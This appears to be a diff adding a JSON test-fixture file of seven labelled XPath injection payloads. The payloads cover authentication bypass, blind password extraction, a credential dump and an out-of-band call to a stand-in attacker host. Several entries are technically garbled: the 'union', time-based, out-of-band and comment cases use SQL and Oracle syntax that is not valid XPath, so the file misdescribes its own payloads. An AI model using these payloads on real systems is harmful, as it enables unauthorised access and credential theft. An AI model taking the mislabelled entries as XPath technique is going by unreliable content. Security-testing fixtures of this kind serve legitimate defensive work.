@@ -1,0 +1,53 @@
+{
+    "xpath_injection_cases": [
+        {
+            "id": "XPATH_INJ_001",
+            "description": "Basic XPath Injection",
+            "payload": "' or '1'='1",
+            "expected_result": "Bypass authentication by always returning true.",
+            "success_criteria": "Access granted to unauthorized user."
+        },
+        {
+            "id": "XPATH_INJ_002",
+            "description": "Blind XPath Injection",
+            "payload": "admin' and substring(password,1,1)='a",
+            "expected_result": "Retrieve the first letter of the password for the user 'admin'.",
+            "success_criteria": "First character of password is obtained."
+        },
+        {
+            "id": "XPATH_INJ_003",
+            "description": "Union XPath Injection",
+            "payload": "' union select all username, password from users where 'x'='x",
+            "expected_result": "Retrieve all usernames and passwords from the users data store.",
+            "success_criteria": "List of usernames and passwords is extracted."
+        },
+        {
+            "id": "XPATH_INJ_004",
+            "description": "Error-Based XPath Injection",
+            "payload": "' and count(/user[id='100'])=1 or '1'='2",
+            "expected_result": "Trigger an XPath error that reveals information.",
+            "success_criteria": "Error message contains useful information for further exploitation."
+        },
+        {
+            "id": "XPATH_INJ_005",
+            "description": "Time-Based Blind XPath Injection",
+            "payload": "admin' and if(1=1, sleep(10), 'false') and '1'='1",
+            "expected_result": "Cause a delay when the condition is true, confirming the injection without returning data.",
+            "success_criteria": "Response time is significantly longer, indicating the condition is true."
+        },
+        {
+            "id": "XPATH_INJ_006",
+            "description": "Out-of-Band XPath Injection",
+            "payload": "admin' and extractvalue(xmltype('<!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://attacker.com\"> %remote;]>'), '//text()') and '1'='1",
+            "expected_result": "Force the server to make a DNS request to the attacker's server.",
+            "success_criteria": "DNS lookup is observed on the attacker's server."
+        },
+        {
+            "id": "XPATH_INJ_007",
+            "description": "XPath Injection with Comments",
+            "payload": "admin' and (1=1) and '1'='1' --",
+            "expected_result": "Use comments to ignore the rest of the query.",
+            "success_criteria": "Query is executed successfully ignoring any appended conditions."
+        }
+    ]
+}
